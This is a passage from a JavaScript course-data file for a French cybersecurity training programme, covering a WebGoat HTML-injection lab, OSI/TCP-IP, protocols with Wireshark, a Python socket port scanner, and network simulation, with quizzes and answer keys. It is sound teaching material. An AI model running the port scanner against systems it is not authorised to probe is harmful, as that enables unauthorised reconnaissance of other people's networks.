  analogy: { title: "🏥 L'audit comme un diagnostic médical", text: "Un audit de sécurité ressemble à une consultation médicale : on observe les symptômes (comportement anormal), on pose un diagnostic (vulnérabilité identifiée), puis on prescrit un traitement (recommandation de correction) — jamais l'inverse." },
  lesson: [
    { heading: "Déployer WebGoat en environnement contrôlé", html: "<p>WebGoat s'exécute généralement via Docker : <code>docker run -p 8080:8080 webgoat/webgoat</code>. Cet environnement est <strong>volontairement vulnérable</strong> et ne doit jamais être exposé sur internet.</p>" },
    { heading: "Réaliser une injection HTML simple", html: "<p>Un champ de saisie non filtré peut accepter du code HTML au lieu d'un texte brut. Si ce contenu est ensuite affiché sans être « échappé », le navigateur l'interprète — c'est le principe fondateur de la faille XSS que l'on approfondira en phase 3.</p>" },
    { heading: "Lire du code vulnérable", html: "<p>Analyser le code source d'un module WebGoat permet de comprendre <em>pourquoi</em> une entrée utilisateur devient dangereuse : absence de validation, absence d'échappement, confiance excessive envers le client.</p>" },
    { heading: "Structurer un rapport d'audit", html: "<p>Un rapport professionnel suit toujours la même trame : résumé exécutif, méthodologie, liste des vulnérabilités (avec sévérité), preuve de concept, recommandations. C'est le format attendu dans les certifications eJPT et OSCP.</p>" }
  ],
  standards: ["OWASP Testing Guide", "PTES — Penetration Testing Execution Standard (structure de rapport)"],
  steps: [
    { text: "Mettre en place OWASP WebGoat.", color: "blue" },
    { text: "Injection HTML simple.", color: "orange" },
    { text: "Analyser le code vulnérable.", color: "blue" },
    { text: "Documenter l'attaque.", color: "orange" },
    { text: "Proposer des corrections.", color: "blue" },
    { text: "Livrable : mini-rapport d'audit.", color: "red" }
  ],
  deliverable: "Un mini-rapport d'audit (2-3 pages) documentant une injection HTML réalisée sur WebGoat, avec preuve de concept et recommandations de correction — clôture de la Phase 1.",
  tp: {
    title: "TP S6 — Projet de phase : premier audit documenté",
    objectif: "Mener une mini-évaluation de sécurité de bout en bout sur un environnement légal et produire un livrable professionnel.",
    duree: "3 à 4 heures (projet de synthèse)",
    materiel: ["Docker installé", "OWASP WebGoat", "VS Code (extension Markdown All in One)"],
    consignes: [
      "Déployer WebGoat localement via Docker et accéder à l'interface sur http://localhost:8080/WebGoat.",
      "Compléter la leçon « HTML Injection introduction » du module.",
      "Capturer chaque étape de l'exploitation (avant/après).",
      "Ouvrir et analyser le fragment de code source concerné pour comprendre l'origine de la faille.",
      "Rédiger un rapport Markdown : résumé exécutif, méthodologie, preuve de concept (captures), sévérité (faible/moyenne/haute), recommandations.",
      "Préparer une présentation orale de 5 minutes résumant la démarche et les résultats."
    ],
    livrable: "Rapport d'audit Markdown complet + support de présentation orale (5 min).",
    criteres: ["Faille correctement exploitée et documentée avec preuve", "Rapport structuré selon la trame professionnelle (résumé, méthodo, PoC, recommandations)", "Recommandations de correction pertinentes et réalistes"]
  },
  quiz: [
    { q: "Qu'est-ce que WebGoat ?", options: ["Un pare-feu open-source", "Une application web volontairement vulnérable pour l'apprentissage", "Un antivirus", "Un langage de programmation"], correct: 1, explanation: "WebGoat est maintenue par l'OWASP spécifiquement pour permettre un apprentissage légal et sécurisé des vulnérabilités web." },
    { q: "Pourquoi une injection HTML est-elle possible sur un champ de saisie ?", options: ["Le serveur est trop lent", "L'entrée utilisateur n'est pas correctement validée ou échappée avant affichage", "Le navigateur est obsolète", "Le mot de passe est trop court"], correct: 1, explanation: "Sans validation ni échappement des caractères spéciaux, le navigateur interprète le contenu injecté comme du code HTML légitime." },
    { q: "Quelle est la première section attendue dans un rapport d'audit professionnel ?", options: ["La liste des outils utilisés", "Le résumé exécutif", "Le code source complet", "La facture"], correct: 1, explanation: "Le résumé exécutif permet à un lecteur non technique (direction) de comprendre rapidement l'essentiel des résultats et risques." },
    { q: "Sur quel type d'environnement doit-on s'exercer aux techniques offensives durant ce programme ?", options: ["N'importe quel site public", "Uniquement des environnements de laboratoire autorisés (WebGoat, VM personnelles)", "Le site d'un concurrent", "Un réseau Wi-Fi public"], correct: 1, explanation: "Le cadre éthique et légal du programme HACKINÉTIQUE impose de n'agir que sur des cibles autorisées, jamais sur des systèmes tiers sans consentement." },
    { q: "Quel standard international structure la méthodologie d'un test d'intrusion et de son rapport ?", options: ["ISO 9001", "PTES — Penetration Testing Execution Standard", "HTML5", "RGPD"], correct: 1, explanation: "Le PTES définit les étapes standard d'un test d'intrusion : pré-engagement, reconnaissance, exploitation, post-exploitation, rapport." }
  ]
}
];

// PHASE 2 — RÉSEAUX & SYSTÈMES (S7 à S12)
const PHASE2 = [
{
  id: "S7", week: 7, phase: 2,
  title: "Modèle OSI et TCP/IP",
  level: "intermediaire",
  duration: "Semaine 7 · ~6h",
  intro: "Comprendre un réseau, c'est d'abord comprendre comment les données voyagent d'une machine à une autre. Cette semaine ouvre la Phase 2 avec les deux modèles théoriques utilisés par tous les professionnels du réseau et de la cybersécurité : le modèle OSI (ISO/IEC 7498-1) et le modèle TCP/IP. Sans ces fondations, impossible de lire une capture Wireshark, de configurer un pare-feu ou de comprendre une attaque réseau.",
  objectives: [
    "Identifier et décrire le rôle des 7 couches du modèle OSI.",
    "Comparer le modèle OSI et le modèle TCP/IP en 4 couches.",
    "Calculer une adresse IP, un masque de sous-réseau et une plage d'adresses utilisables.",
    "Expliquer le principe d'encapsulation et de décapsulation des données.",
    "Associer un protocole ou un équipement réseau à sa couche OSI correspondante."
  ],
  definition: "Les 7 couches OSI (Physique, Liaison, Réseau, Transport, Session, Présentation, Application). Adressage IP, sous-réseaux, masques. Encapsulation des données à travers les couches.",
  analogy: { title: "📦 Le modèle OSI comme un système postal", text: "Une lettre passe par plusieurs étapes indépendantes : rédaction du message, mise sous enveloppe, adresse postale, tri au centre de distribution, transport physique. Chaque étape ignore le contenu des autres — le facteur n'a pas besoin de lire la lettre pour la livrer. Le modèle OSI fonctionne pareil : chaque couche ajoute son enveloppe (en-tête) sans se soucier du contenu des couches supérieures." },
  keyTerms: [
    { term: "OSI", def: "Open Systems Interconnection : modèle de référence en 7 couches normalisé par l'ISO/IEC 7498-1, décrivant les fonctions nécessaires à une communication réseau." },
    { term: "TCP/IP", def: "Suite de protocoles à 4 couches (Accès réseau, Internet, Transport, Application) qui est réellement implémentée sur Internet." },
    { term: "Encapsulation", def: "Processus d'ajout successif d'en-têtes à chaque couche lorsque les données descendent de l'application vers le support physique." },
    { term: "Masque de sous-réseau", def: "Valeur binaire de 32 bits qui distingue la partie réseau de la partie hôte d'une adresse IPv4." },
    { term: "CIDR", def: "Classless Inter-Domain Routing : notation d'adressage (ex. /24) indiquant le nombre de bits réservés à la partie réseau." }
  ],
  lesson: [
    { heading: "Pourquoi un modèle en couches ?", html: "<p>Avant les modèles normalisés, chaque constructeur développait ses propres protocoles incompatibles entre eux. L'ISO a publié en 1984 le modèle <strong>OSI (ISO/IEC 7498-1)</strong> pour standardiser la façon de penser un réseau : chaque couche a une responsabilité précise et communique uniquement avec la couche directement au-dessus et en dessous d'elle. Ce découpage facilite le diagnostic de panne, la conception d'équipements et la formation des professionnels.</p>" },
    { heading: "Les 7 couches OSI en détail", html: "<ul><li><strong>Couche 7 — Application</strong> : interface avec l'utilisateur (HTTP, DNS, FTP, SMTP).</li><li><strong>Couche 6 — Présentation</strong> : mise en forme, chiffrement, compression des données (SSL/TLS, JPEG).</li><li><strong>Couche 5 — Session</strong> : ouverture, maintien et fermeture des sessions de communication.</li><li><strong>Couche 4 — Transport</strong> : fiabilité du transfert, segmentation (TCP, UDP).</li><li><strong>Couche 3 — Réseau</strong> : adressage logique et routage (IP, ICMP).</li><li><strong>Couche 2 — Liaison de données</strong> : adressage physique et trames (Ethernet, MAC, switchs).</li><li><strong>Couche 1 — Physique</strong> : transmission des bits sur le support (câble, fibre, Wi-Fi).</li></ul><p>Un moyen mnémotechnique classique en français : <em>« Après Plusieurs Semaines Toujours Rien À Prévoir »</em> (Application, Présentation, Session, Transport, Réseau, Liaison, Physique en partant du haut).</p>" },
    { heading: "Le modèle TCP/IP : la version pratique", html: "<p>Le modèle réellement utilisé sur Internet est plus simple, en 4 couches, décrit historiquement dans la RFC 1122 :</p><ul><li><strong>Application</strong> — regroupe les couches OSI 5, 6 et 7 (HTTP, DNS, SSH...).</li><li><strong>Transport</strong> — correspond à la couche 4 OSI (TCP, UDP).</li><li><strong>Internet</strong> — correspond à la couche 3 OSI (IP, ICMP, routage).</li><li><strong>Accès réseau</strong> — regroupe les couches OSI 1 et 2 (Ethernet, Wi-Fi, ARP).</li></ul><p>OSI reste un outil pédagogique et de diagnostic ; TCP/IP est l'implémentation réellement déployée.</p>" },
    { heading: "Adressage IP et sous-réseaux", html: "<p>Une adresse IPv4 s'écrit sur 32 bits, répartis en 4 octets (ex. <code>192.168.1.10</code>). Le masque de sous-réseau détermine quelle portion identifie le réseau et quelle portion identifie l'hôte.</p><pre><code>Adresse   : 192.168.1.10\nMasque    : 255.255.255.0  (soit /24)\nRéseau    : 192.168.1.0\nBroadcast : 192.168.1.255\nHôtes utilisables : 192.168.1.1 à 192.168.1.254 (254 hôtes)</code></pre><p>Formule à retenir : le nombre d'hôtes utilisables sur un sous-réseau se calcule avec <code>2^(32-préfixe) - 2</code> (on retire l'adresse réseau et l'adresse de broadcast).</p>" },
    { heading: "Encapsulation et décapsulation", html: "<p>Quand une application envoie des données, chaque couche descendante ajoute son propre en-tête : les données deviennent un <strong>segment</strong> (couche Transport, ajout des ports), puis un <strong>paquet</strong> (couche Réseau, ajout des adresses IP), puis une <strong>trame</strong> (couche Liaison, ajout des adresses MAC), avant d'être transmises sous forme de <strong>bits</strong>. À la réception, le processus inverse — la décapsulation — retire chaque en-tête couche par couche jusqu'à restituer les données originales à l'application.</p>" }
  ],
  standards: ["ISO/IEC 7498-1 — Modèle de référence OSI", "RFC 791 — Internet Protocol (IPv4)", "RFC 1122 — Requirements for Internet Hosts (modèle TCP/IP en 4 couches)", "CompTIA Network+ — Domaine 1.0 : Networking Concepts"],
  steps: [
    { text: "Découvrir les 7 couches du modèle OSI et leur rôle respectif.", color: "blue" },
    { text: "Comparer le modèle OSI avec le modèle TCP/IP en 4 couches.", color: "orange" },
    { text: "Calculer des adresses IP, des masques de sous-réseau et des plages d'hôtes.", color: "blue" },
    { text: "Comprendre le principe d'encapsulation/décapsulation des données.", color: "orange" },
    { text: "Livrable : schéma commenté du modèle OSI/TCP-IP avec un exemple d'encapsulation.", color: "red" }
  ],
  deliverable: "Un schéma commenté (papier ou logiciel) représentant les 7 couches OSI en regard des 4 couches TCP/IP, accompagné d'un exemple chiffré d'encapsulation d'une requête HTTP et d'un calcul de sous-réseau complet.",
  tp: {
    title: "TP S7 — Modéliser une communication réseau et calculer un sous-réseau",
    objectif: "Manipuler concrètement l'encapsulation des données et l'adressage IP pour ancrer la théorie des couches OSI/TCP-IP.",
    duree: "60–90 minutes",
    materiel: ["Feuille de calcul ou éditeur de texte", "Calculatrice binaire (ou calcul manuel)", "Un ordinateur avec accès à un terminal (ping, ipconfig/ifconfig)"],
    consignes: [
      "Dessiner un schéma des 7 couches OSI avec, pour chacune, un protocole ou équipement représentatif.",
      "Faire correspondre chaque couche OSI à sa couche TCP/IP équivalente sur le même schéma.",
      "Pour l'adresse 172.16.20.130 avec un masque /26, calculer : adresse réseau, adresse de broadcast, plage d'hôtes utilisables et nombre total d'hôtes.",
      "Sur votre machine, exécuter la commande d'affichage de configuration IP (`ipconfig` sous Windows ou `ip a` sous Linux) et identifier votre propre adresse IP, masque et passerelle.",
      "Décrire par écrit, étape par étape, l'encapsulation d'une requête HTTP depuis le navigateur jusqu'au câble réseau (couche par couche).",
      "Vérifier votre calcul de sous-réseau avec un calculateur en ligne ou un script et corriger si nécessaire.",
      "Produire le livrable final : schéma + calcul de sous-réseau + description de l'encapsulation."
    ],
    livrable: "Un document (PDF ou image) contenant le schéma OSI/TCP-IP commenté, le calcul de sous-réseau détaillé et la description de l'encapsulation d'une requête HTTP.",
    criteres: ["Les 7 couches OSI sont correctement nommées et associées à un exemple", "Le calcul de sous-réseau (réseau, broadcast, plage, nombre d'hôtes) est exact", "L'encapsulation est décrite dans le bon ordre (Application → Transport → Réseau → Liaison → Physique)"]
  },
  quiz: [
    { q: "Combien de couches compte le modèle OSI défini par l'ISO/IEC 7498-1 ?", options: ["4", "5", "7", "8"], correct: 2, explanation: "Le modèle OSI comporte exactement 7 couches, de la couche Physique (1) à la couche Application (7)." },
    { q: "À quelle couche OSI appartient l'adressage IP et le routage ?", options: ["Couche 2 — Liaison de données", "Couche 3 — Réseau", "Couche 4 — Transport", "Couche 7 — Application"], correct: 1, explanation: "La couche 3 (Réseau) gère l'adressage logique (IP) et le routage des paquets entre réseaux." },
    { q: "Pour l'adresse 192.168.1.10/24, quelle est l'adresse de broadcast ?", options: ["192.168.1.0", "192.168.1.1", "192.168.1.255", "192.168.255.255"], correct: 2, explanation: "Avec un masque /24 (255.255.255.0), les 8 derniers bits sont réservés aux hôtes ; l'adresse de broadcast est donc 192.168.1.255 (tous les bits hôtes à 1)." },
    { q: "Quel terme désigne les données de la couche Transport après ajout de son en-tête ?", options: ["Trame", "Paquet", "Segment", "Bit"], correct: 2, explanation: "À la couche Transport (TCP/UDP), l'unité de données s'appelle un segment. Elle devient un paquet à la couche Réseau, puis une trame à la couche Liaison." },
    { q: "Le modèle TCP/IP regroupe quelles couches OSI dans sa couche Application ?", options: ["Uniquement la couche 7", "Les couches 5, 6 et 7", "Les couches 1 et 2", "Les couches 3 et 4"], correct: 1, explanation: "La couche Application du modèle TCP/IP (RFC 1122) fusionne les couches Session, Présentation et Application du modèle OSI." }
  ]
},
{
  id: "S8", week: 8, phase: 2,
  title: "Protocoles fondamentaux",
  level: "intermediaire",
  duration: "Semaine 8 · ~6h",
  intro: "Un réseau ne fonctionne que grâce à des protocoles qui s'accordent sur des règles communes. Cette semaine explore les protocoles que vous croiserez à chaque audit ou incident : DNS, DHCP, HTTP/HTTPS et FTP, avant de passer à la pratique avec Wireshark, l'outil de capture de trames de référence utilisé par les analystes réseau et les pentesters.",
  objectives: [
    "Expliquer le fonctionnement du DNS et le processus de résolution de nom.",
    "Décrire le mécanisme DHCP d'attribution automatique d'adresse IP.",
    "Différencier HTTP et HTTPS ainsi que le rôle du chiffrement TLS.",
    "Installer Wireshark et capturer du trafic réseau réel.",
    "Associer les ports standards aux services qu'ils représentent."
  ],
  definition: "DNS, DHCP, HTTP/HTTPS, FTP. Capture et analyse de trames avec Wireshark. Correspondance entre ports et services.",
  analogy: { title: "📖 Le DNS comme un annuaire téléphonique", text: "Personne ne mémorise un numéro de téléphone pour chaque contact : on cherche un nom dans l'annuaire. Le DNS joue exactement ce rôle pour Internet : il traduit un nom de domaine humain (ex. cjepe-benin.org) en une adresse IP que les machines savent utiliser." },
  keyTerms: [
    { term: "DNS", def: "Domain Name System : système hiérarchique et distribué qui traduit les noms de domaine en adresses IP (RFC 1035)." },
    { term: "DHCP", def: "Dynamic Host Configuration Protocol : protocole qui attribue automatiquement une adresse IP et des paramètres réseau à un client (RFC 2131)." },
    { term: "TLS", def: "Transport Layer Security : protocole de chiffrement qui sécurise HTTP en HTTPS et protège la confidentialité des échanges." },
    { term: "Port", def: "Numéro (0-65535) qui identifie un service ou une application sur une machine, utilisé par TCP et UDP." },
    { term: "Wireshark", def: "Analyseur de protocole réseau open source permettant de capturer et d'inspecter le trafic trame par trame." }
  ],
  lesson: [
    { heading: "DNS : traduire les noms en adresses", html: "<p>Le DNS (RFC 1035) fonctionne de manière hiérarchique : un client interroge un résolveur, qui interroge à son tour un serveur racine, puis un serveur de la zone (.com, .org...), puis le serveur faisant autorité pour le domaine exact. Le résultat est mis en cache pour accélérer les requêtes futures.</p><pre><code>$ nslookup cjepe-benin.org\nServeur:  resolver1.opendns.com\nAddress:  208.67.222.222\n\nNom:    cjepe-benin.org\nAddress: 203.0.113.42</code></pre>" },
    { heading: "DHCP : le processus DORA", html: "<p>Le DHCP (RFC 2131) attribue dynamiquement une adresse IP en 4 étapes, résumées par l'acronyme <strong>DORA</strong> :</p><ul><li><strong>Discover</strong> — le client diffuse une requête pour trouver un serveur DHCP.</li><li><strong>Offer</strong> — le serveur propose une adresse IP disponible.</li><li><strong>Request</strong> — le client demande formellement cette adresse.</li><li><strong>Acknowledge</strong> — le serveur confirme l'attribution (bail).</li></ul>" },
    { heading: "HTTP, HTTPS et FTP", html: "<p><strong>HTTP</strong> (port 80) transmet les pages web en clair. <strong>HTTPS</strong> (port 443) ajoute une couche TLS qui chiffre et authentifie la communication — c'est aujourd'hui le standard exigé pour tout site professionnel. <strong>FTP</strong> (ports 20/21) transfère des fichiers, historiquement sans chiffrement, ce qui en fait un protocole à proscrire sur un réseau non maîtrisé au profit de SFTP ou FTPS.</p>" },
    { heading: "Installer et utiliser Wireshark", html: "<p>Téléchargez Wireshark depuis <code>wireshark.org</code> et installez-le avec les pilotes de capture (Npcap sous Windows). Lancez une capture sur votre interface active, puis filtrez le trafic pour ne garder que ce qui vous intéresse :</p><pre><code>dns\nhttp\nip.addr == 192.168.1.10\ntcp.port == 443</code></pre><p>Chaque trame capturée affiche les en-têtes de toutes les couches traversées — c'est la meilleure façon de visualiser concrètement l'encapsulation étudiée en semaine 7.</p>" },
    { heading: "Ports et services standards", html: "<table><tr><th>Port</th><th>Service</th></tr><tr><td>21</td><td>FTP</td></tr><tr><td>22</td><td>SSH</td></tr><tr><td>53</td><td>DNS</td></tr><tr><td>67/68</td><td>DHCP</td></tr><tr><td>80</td><td>HTTP</td></tr><tr><td>443</td><td>HTTPS</td></tr></table><p>Cette correspondance, maintenue officiellement par l'IANA, est la base de toute analyse de capture réseau ou de résultat de scan de ports.</p>" }
  ],
  standards: ["RFC 1035 — Domain Names, Implementation and Specification (DNS)", "RFC 2131 — Dynamic Host Configuration Protocol", "IANA Service Name and Transport Protocol Port Number Registry", "CompTIA Network+ — Domaine 1.4 : protocoles et ports courants"],
  steps: [
    { text: "Comprendre le fonctionnement du DNS et sa hiérarchie.", color: "blue" },
    { text: "Découvrir DHCP, HTTP/HTTPS et FTP.", color: "orange" },
    { text: "Installer Wireshark et ses pilotes de capture.", color: "blue" },
    { text: "Analyser des trames capturées en direct.", color: "orange" },
    { text: "Associer les ports standards aux services correspondants.", color: "blue" },
    { text: "Livrable : analyse Wireshark commentée d'une capture réelle.", color: "red" }
  ],
  deliverable: "Un rapport d'analyse Wireshark comprenant une capture de résolution DNS, une capture d'échange HTTP ou HTTPS, et un tableau des ports/services identifiés dans la capture, chaque trame étant commentée.",
  tp: {
    title: "TP S8 — Capture et analyse de trafic réseau avec Wireshark",
    objectif: "Observer concrètement les protocoles DNS, DHCP et HTTP/HTTPS en capturant du trafic réel et en identifiant les ports utilisés.",
    duree: "60–90 minutes",
    materiel: ["Wireshark installé", "Connexion réseau active", "Navigateur web"],
    consignes: [
      "Installer Wireshark et vérifier que la capture sur l'interface réseau active fonctionne.",
      "Lancer une capture, puis ouvrir un navigateur et visiter un site en HTTP et un site en HTTPS.",
      "Appliquer le filtre `dns` et identifier au moins une requête et une réponse DNS.",
      "Appliquer le filtre `http` puis `tls` pour comparer une communication en clair et une communication chiffrée.",
      "Repérer dans la capture au moins 4 ports différents et les associer à leur service (tableau IANA).",
      "Arrêter la capture et exporter les paquets pertinents dans un fichier .pcapng.",
      "Rédiger un compte-rendu expliquant, trame par trame, ce qui a été observé."
    ],
    livrable: "Fichier de capture .pcapng exporté accompagné d'un compte-rendu écrit identifiant les protocoles, ports et échanges observés.",
    criteres: ["Une résolution DNS complète est identifiée et expliquée", "La différence HTTP/HTTPS est illustrée par des captures concrètes", "Au moins 4 ports sont correctement associés à leur service", "Le compte-rendu est clair et structuré"]
  },
  quiz: [
    { q: "Quel port standard est utilisé par HTTPS ?", options: ["21", "80", "443", "3389"], correct: 2, explanation: "HTTPS utilise le port 443 par défaut, avec une session TLS qui chiffre les échanges HTTP." },
    { q: "Que signifie l'acronyme DORA dans le processus DHCP ?", options: ["Discover, Offer, Request, Acknowledge", "Data, Open, Read, Acquire", "Domain, Origin, Route, Address", "Discover, Open, Resolve, Assign"], correct: 0, explanation: "DORA résume les 4 échanges du DHCP : Discover (client), Offer (serveur), Request (client), Acknowledge (serveur), conformément à la RFC 2131." },
    { q: "Quel outil permet de capturer et d'analyser des trames réseau en temps réel ?", options: ["Nmap", "Wireshark", "Metasploit", "Nikto"], correct: 1, explanation: "Wireshark est l'analyseur de protocole de référence pour capturer et inspecter le trafic réseau trame par trame." },
    { q: "Quel protocole traduit un nom de domaine en adresse IP ?", options: ["DHCP", "FTP", "DNS", "HTTP"], correct: 2, explanation: "Le DNS (RFC 1035) assure la résolution de noms de domaine en adresses IP, de façon hiérarchique et distribuée." },
    { q: "Pourquoi FTP est-il considéré comme risqué sur un réseau non maîtrisé ?", options: ["Il est trop lent", "Il transmet les identifiants et données en clair", "Il n'existe plus depuis 2010", "Il utilise uniquement UDP"], correct: 1, explanation: "FTP transmet par défaut les identifiants et le contenu des fichiers sans chiffrement, exposant les données à une interception ; SFTP ou FTPS doivent être préférés." }
  ]
},
{
  id: "S9", week: 9, phase: 2,
  title: "Python pour la sécurité",
  level: "intermediaire",
  duration: "Semaine 9 · ~7h",
  intro: "Python est le langage de prédilection de la cybersécurité offensive et défensive : la majorité des outils d'automatisation, de scan et d'exploitation reposent dessus. Cette semaine construit les bases du langage puis les applique immédiatement à un cas concret : écrire un script de scan de ports fonctionnel.",
  objectives: [
    "Écrire des scripts Python en utilisant variables, types et opérateurs de base.",
    "Structurer un script avec des boucles et des conditions.",
    "Définir des fonctions réutilisables et manipuler des fichiers.",
    "Utiliser les bibliothèques requests et socket pour dialoguer avec le réseau.",
    "Développer un script Python de scan de ports simple."
  ],
  definition: "Syntaxe Python : variables, boucles, fonctions. Bibliothèques réseau requests et socket appliquées à des cas de sécurité.",
  analogy: { title: "🧰 Python comme boîte à outils modulable", text: "Un couteau suisse effectue quelques tâches ; Python, lui, s'adapte à presque tout grâce à ses bibliothèques : `requests` pour parler HTTP, `socket` pour dialoguer directement avec le réseau, `scapy` plus tard pour forger des paquets. Apprendre Python, c'est apprendre à assembler les bons outils pour chaque mission." },
  keyTerms: [
    { term: "Interpréteur", def: "Programme qui exécute le code Python ligne par ligne, sans étape de compilation séparée." },
    { term: "Bibliothèque (module)", def: "Ensemble de fonctions prêtes à l'emploi importées dans un script avec `import`." },
    { term: "Socket", def: "Interface de programmation bas niveau permettant à un script d'ouvrir une connexion réseau (bibliothèque `socket`)." },
    { term: "requests", def: "Bibliothèque Python tierce qui simplifie l'envoi de requêtes HTTP/HTTPS." },
    { term: "Exception", def: "Erreur interceptable à l'exécution (ex. `try/except`) permettant de gérer proprement les échecs de connexion." }
  ],
  lesson: [
    { heading: "Syntaxe de base : variables et types", html: "<p>Python utilise un typage dynamique : pas besoin de déclarer le type d'une variable.</p><pre><code>cible = \"192.168.1.10\"\nport = 22\nest_ouvert = True\nprint(f\"Scan de {cible} sur le port {port}\")</code></pre><p>Les types de base sont <code>str</code> (texte), <code>int</code> (entier), <code>float</code> (décimal), <code>bool</code> (booléen) et les structures <code>list</code> et <code>dict</code>.</p>" },
    { heading: "Boucles et conditions", html: "<p>Les boucles <code>for</code> et les conditions <code>if/elif/else</code> structurent la logique d'un script :</p><pre><code>ports = [21, 22, 80, 443]\nfor port in ports:\n    if port == 22:\n        print(\"Port SSH détecté\")\n    else:\n        print(f\"Port {port} à tester\")</code></pre>" },
    { heading: "Fonctions et fichiers", html: "<p>Une fonction encapsule une logique réutilisable. La gestion de fichiers avec <code>with open()</code> garantit une fermeture propre même en cas d'erreur :</p><pre><code>def enregistrer_resultat(port, statut):\n    with open(\"resultats.txt\", \"a\") as f:\n        f.write(f\"Port {port} : {statut}\\n\")\n\nenregistrer_resultat(22, \"ouvert\")</code></pre>" },
    { heading: "Bibliothèques requests et socket", html: "<p>La bibliothèque <code>requests</code> simplifie les échanges HTTP :</p><pre><code>import requests\nreponse = requests.get(\"https://example.com\")\nprint(reponse.status_code)</code></pre><p>La bibliothèque <code>socket</code>, native à Python, ouvre une connexion réseau brute — c'est elle qui sert de base à un scanner de ports :</p><pre><code>import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(1)\nresultat = s.connect_ex((\"192.168.1.10\", 22))\nprint(\"ouvert\" if resultat == 0 else \"fermé\")\ns.close()</code></pre>" },
    { heading: "Assembler un scanner de ports", html: "<p>En combinant boucle, fonction et <code>socket</code>, on obtient un scanner minimal :</p><pre><code>import socket\n\ndef scan_port(cible, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(0.5)\n    resultat = s.connect_ex((cible, port))\n    s.close()\n    return resultat == 0\n\ncible = \"192.168.1.10\"\nfor port in range(1, 1025):\n    if scan_port(cible, port):\n        print(f\"Port {port} ouvert\")</code></pre><p>Ce script illustre le principe même des outils comme Nmap, en version pédagogique et volontairement limitée.</p>" }
  ],
  standards: ["CompTIA Security+ — Domaine 4.4 : scripts d'automatisation de la sécurité", "NIST SP 800-115 — Technical Guide to Information Security Testing and Assessment (usage d'outils/scripts de reconnaissance)", "PEP 8 — Style Guide for Python Code"],
  steps: [
    { text: "Découvrir la syntaxe Python : variables, types, opérateurs.", color: "blue" },
    { text: "Structurer un script avec boucles et conditions.", color: "orange" },
    { text: "Écrire des fonctions et manipuler des fichiers.", color: "blue" },
    { text: "Utiliser les bibliothèques requests et socket pour dialoguer avec le réseau.", color: "orange" },
    { text: "Assembler un script de scan de ports fonctionnel.", color: "blue" },
    { text: "Livrable : script Python de scan de ports commenté et testé.", color: "red" }
  ],
  deliverable: "Un script Python fonctionnel de scan de ports (module socket), capable de tester une plage de ports sur une cible, d'afficher les ports ouverts et d'enregistrer les résultats dans un fichier texte, accompagné de commentaires explicatifs.",
  tp: {
    title: "TP S9 — Développer un scanner de ports en Python",
    objectif: "Consolider les bases Python en produisant un outil réseau fonctionnel, premier jalon avant les outils offensifs des phases suivantes.",
    duree: "90 minutes",
    materiel: ["Python 3 installé", "VS Code avec l'extension Python", "Une machine cible autorisée (VM locale ou localhost)"],
    consignes: [
      "Créer un fichier `scanner.py` dans un nouveau dossier de projet.",
      "Écrire une fonction `scan_port(cible, port)` utilisant le module `socket` et retournant `True` si le port est ouvert.",
      "Ajouter une boucle `for` qui teste une plage de ports (ex. 1 à 100) sur une cible autorisée (VM locale).",
      "Ajouter une gestion d'erreurs avec `try/except` pour éviter que le script ne plante sur une erreur réseau.",
      "Enregistrer les ports ouverts détectés dans un fichier `resultats.txt` via une fonction dédiée.",
      "Tester le script sur une VM locale dont vous êtes propriétaire et documenter les résultats obtenus.",
      "Ajouter des commentaires expliquant chaque bloc du script."
    ],
    livrable: "Fichier `scanner.py` fonctionnel, commenté, accompagné du fichier `resultats.txt` généré lors d'un test réel sur une cible autorisée.",
    criteres: ["Le script s'exécute sans erreur et détecte correctement au moins un port ouvert connu", "La gestion des exceptions est présente et pertinente", "Le code est commenté et respecte une structure lisible (PEP 8)", "Les résultats sont correctement enregistrés dans un fichier"]
  },
  quiz: [
    { q: "Quelle bibliothèque Python native permet d'ouvrir une connexion réseau bas niveau ?", options: ["requests", "socket", "os", "json"], correct: 1, explanation: "Le module `socket`, natif à Python, fournit les primitives pour ouvrir des connexions TCP/UDP, base de tout scanner de ports." },
    { q: "Que retourne `connect_ex()` lorsqu'un port est fermé (dans la majorité des cas) ?", options: ["0", "Une valeur différente de 0", "None", "Une exception systématique"], correct: 1, explanation: "`connect_ex()` retourne 0 en cas de connexion réussie (port ouvert) et un code d'erreur non nul sinon, ce qui évite de lever une exception à chaque tentative." },
    { q: "Quelle instruction permet de gérer proprement une erreur sans arrêter le script ?", options: ["if/else", "for/in", "try/except", "def/return"], correct: 2, explanation: "Le bloc `try/except` intercepte les exceptions à l'exécution, indispensable pour un script réseau confronté à des timeouts ou des refus de connexion." },
    { q: "À quoi sert principalement la bibliothèque `requests` ?", options: ["Chiffrer des fichiers", "Envoyer des requêtes HTTP/HTTPS simplement", "Gérer les threads", "Analyser des paquets binaires"], correct: 1, explanation: "`requests` est une bibliothèque tierce qui simplifie considérablement l'envoi de requêtes HTTP/HTTPS par rapport aux modules bas niveau." },
    { q: "Dans le scanner de ports de la leçon, à quoi sert `s.settimeout(0.5)` ?", options: ["À fermer le socket immédiatement", "À limiter le temps d'attente d'une réponse avant de considérer le port fermé", "À chiffrer la connexion", "À changer le port scanné"], correct: 1, explanation: "`settimeout()` définit une durée maximale d'attente pour la connexion, évitant que le scan ne reste bloqué indéfiniment sur un port qui ne répond pas." }
  ]
},
{
  id: "S10", week: 10, phase: 2,
  title: "Architecture réseau & simulation",
  level: "intermediaire",
  duration: "Semaine 10 · ~7h",
  intro: "Avant de sécuriser un réseau, il faut savoir le concevoir. Cette semaine passe de la théorie à la pratique via un simulateur (Cisco Packet Tracer ou GNS3) pour construire un plan d'adressage, déployer routeurs et switchs, et segmenter le trafic avec des VLAN — une compétence centrale en entreprise comme en environnement de test.",
  objectives: [
    "Concevoir un plan d'adressage IP cohérent pour un réseau multi-segments.",
    "Installer et prendre en main un simulateur réseau (Packet Tracer ou GNS3).",
    "Construire une topologie réseau avec routeurs, switchs et postes clients.",
    "Configurer des VLAN pour segmenter le trafic réseau.",
    "Tester la connectivité entre les segments simulés."
  ],
  definition: "Plan d'adressage réseau. Simulation avec Packet Tracer ou GNS3. Configuration de routeurs, switchs et VLAN.",
